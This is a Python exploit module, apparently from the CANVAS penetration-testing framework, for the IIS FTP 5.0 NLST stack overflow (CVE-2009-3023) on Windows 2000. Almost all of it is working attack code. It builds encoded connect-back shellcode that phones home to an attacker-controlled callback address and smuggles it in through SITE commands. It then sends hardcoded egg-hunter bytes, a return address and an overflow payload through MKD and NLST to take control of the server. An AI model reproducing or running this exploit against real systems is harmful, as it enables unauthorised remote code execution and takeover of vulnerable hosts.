#! /usr/bin/env python


# CANVAS Microsoft FTP Service 5.0 exploit
#
# Bug Class: Stack overflow
# 

import sys
if "." not in sys.path: sys.path.append(".")

import time

# CANVAS modules
from exploitutils import *
from tcpexploit import *
from libs.wuftplib import FTP

from encoder import *

# GUI info
NAME="IISFTP_NLST"
DESCRIPTION="IIS FTP NLST Stack Overflow"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Microsoft"
DOCUMENTATION["Date public"] = "08/31/09"
DOCUMENTATION["References"] = "http://lists.grok.org.uk/pipermail/full-disclosure/2009-August/070467.html"
DOCUMENTATION["CVE Name"] = "CVE-2009-3023"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3023"
DOCUMENTATION['CVSS'] = 9.0
VERSION="1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "2000" ]
PROPERTY['AUTOHACK_EXCLUDE'] = True

NOTES="""
 """
CHANGELOG="""
"""

targets = {
    0 : ["Autodetect (N/A)", 0x00000000],
    1 : ["Windows 2000 Professional SP4 EN", 0x6FC660CD, 0x7ffdf230] # push esp / ret
          }

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.name=NAME
        self.setInfo(DESCRIPTION)
        self.port = 21
        self.version = 1
        self.badstring = "\x00\\/.:\r\n?\x20\t"
        self.searchbadstring = self.badstring
        self.user = "anonymous"
        self.password = "anonymous"
        return
    
    # satisfy API
    def neededListenerTypes(self):
        from canvasengine import WIN32MOSDEF
        return [WIN32MOSDEF]

    def ftp_connect(self, host, port):
        s = self.gettcpsock()
        s.connect((host, port))
        return s
    
    def ftp_login(self, s, host, user, password):
        s.set_timeout(1.0)

        try:
            ftp = FTP(host, s)
            ftp.login(user, password)
        except:
            s.close()
            return None

        return ftp

    def ftp_setup(self):
        s = self.ftp_connect(self.host, self.port)
        ftp = self.ftp_login(s, self.host, self.user, self.password)
        if ftp == None:
            s.close()
            raise Exception, 'Could not FTP login .. fail'

        return ftp

    def test2(self):
        ftp = self.ftp_setup()
        ftp.quit()

        self.log("[!] remote banner: %s" % ftp.banner)

        if "Microsoft FTP Service (Version 5.0)" in ftp.banner:
            self.version = 1
            return 1

        return 0

    def createShellcode(self):
        sc = shellcodeGenerator.win32()
        sc.addAttr('tcpconnect', {'port' : self.callback.port, 'ipaddress' : self.callback.ip})
        sc.addAttr('SmallRecvExecWin32', {'socketreg' : 'FDSPOT'})
        sc.addAttr('UseWS2Ordinal', None)
        sc.addAttr('findeipnoesp', None)

        sc = sc.get()

        encoder=xorencoder.simpleXOR()
        encoder.setbadstring(self.badstring)
        encoder.find_key(sc)
        sc=encoder.encode(sc)
        self.shellcode = sc.replace('\xff','\xff\xff')

        return self.shellcode

    def send_shellcode(self, ftp):
        sc = self.createShellcode()
        site = "SITE c00k" + sc + "U" * (500-len(sc))    
        for i in range(0,5):
            try:
                res = ftp.sendcmd(site)
            except:
                continue
        return

    def run(self):
        if "user" in self.argsDict:
            self.user = self.argsDict["user"]
        if "password" in self.argsDict:
            self.password = self.argsDict["password"]

        self.host = self.target.interface
        if "port" in self.argsDict:
            self.port = int(self.argsDict["port"])

        self.setInfo("%s attacking %s:%d (in progress)"% (NAME, self.host, self.port))

        if self.version == 0:
            self.log("Auto versioning not available")
            self.setInfo("%s attacking %s:%d - done (failed!)"% (NAME, self.host, self.port))
            return 0

        self.info, self.eip, self.rwaddr = targets[self.version]

        print "Using version %d : %s (0x%X)"% (self.version, self.info, self.eip)
        
        ftp = self.ftp_setup()

        self.send_shellcode(ftp)

        rwaddr = struct.pack("<L", self.rwaddr)
        eip    = struct.pack("<L", self.eip)

        sc = "\x33\xC0\x34\x71\x34\x41\x33\xF6\x64\x33\x30\x56\x58\x34\x59\x34\x41\x33\xF6\x33\x30\x56\x58\x40\x81\x38\x63\x30\x30\x6B\x75\xF7\x40\x40\x40\x40\xFF\xFF\xD0"
        searchcode = sc + "A" * (0x60-len(sc))

        payload = searchcode + rwaddr + "A" * 0x38 + rwaddr + "BBBB" + eip + rwaddr + "C" * 0x10 + "\xe9\x63\xfe\xff\xff\xff\xff" + "D" * 0x12

        mkd = "MKD CCC%s\r\n" % payload
        res = ftp.sendcmd(mkd)

        sport = ftp.makeport()
        nlst = "NLST %s*/../C*/\r\n" % payload
        res = ftp.sendcmd(nlst)

        sport.accept()
        time.sleep(3)

        if self.ISucceeded():
            self.setInfo("%s attacking %s:%d - done (succeeded!)"% (NAME, self.host, self.port))
            return 1
        else:
            self.setInfo("%s attacking %s:%d - done (failed!)"% (NAME, self.host, self.port))            

        ftp.close()
        self.log("Exploit finished.")
        self.setState("done")
        return 0

    def usage(self):
        print "Usage: "+sys.argv[0]+" -v version -t target -l localhost -d localip [ -p port ]"
        print "Login: -O user:username -O password:password"
        i = 0
        for line in targets.values():
            print "\t%d : %s"%(i, line[0])
            i += 1
   
if __name__== '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
        
                
                  


    
        
    
    
